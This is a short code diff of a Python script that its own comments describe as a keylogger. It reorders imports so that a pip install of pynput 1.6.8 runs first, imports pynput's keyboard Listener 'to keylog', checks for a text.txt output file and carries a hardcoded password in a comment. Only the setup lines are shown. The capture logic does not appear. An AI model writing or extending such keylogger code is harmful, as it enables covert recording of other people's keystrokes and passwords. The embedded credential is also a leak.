@@ -1,10 +1,10 @@
+import sys #automatically install pynput
+import subprocess #automatically install pynput
 # script to install pynput (implement pip as a subprocess):
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
 'pynput==1.6.8'])
 import pynput #used to keylog
 import os.path #used to check if text.txt exists
-import sys #automatically install pynput
-import subprocess #automatically install pynput
 from os import path
 #password is iamastuyvesanthacker123@
 from pynput.keyboard import Key, Listener
